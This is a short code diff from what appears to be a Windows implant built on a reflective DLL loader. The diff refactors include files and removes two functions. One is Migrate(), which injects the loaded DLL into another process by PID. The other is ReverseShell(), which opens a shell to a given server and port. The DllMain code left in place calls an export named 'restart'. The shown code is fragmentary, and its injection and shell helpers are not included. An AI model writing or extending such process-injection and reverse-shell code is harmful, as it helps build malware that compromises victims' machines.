@@ -1,15 +1,9 @@
-#include <cstdint>
+#include "internal.h"
 
-#include "shell/sopar.h"
-#include "inject/inject.h"
-#include "reflect/reflect.h"
+#include "../common/pe_structs.h"
 #include "apiget/export.h"
 
-#include "external.h"
-
-struct DllMeta_ DllMeta;
-
-extern "C" BOOL DllMain2(void *where, size_t size);
+struct DllMeta_t DllMeta;
 
 extern "C" BOOL DllMain(void *where, size_t size)
 {
@@ -41,19 +35,4 @@ extern "C" BOOL DllMain2(void *where, size_t size)
     ( (void (*)())GetExport(where, "restart") )();
     
     return TRUE;
-}
-
-void Migrate()
-{
-    if((uint32_t)(uint64_t)GetCurrentProcess() == DllMeta.next.pid){
-        return;
-    }
-
-    _InjectPid(DllMeta.where, DllMeta.size, offset_to_rva(DllMeta.where, &_ReflectiveLoad), DllMeta.next.pid);
-}
-
-void ReverseShell(const char *server, const char *port)
-{
-    sopar test(server, port);
-    test.go();
 }
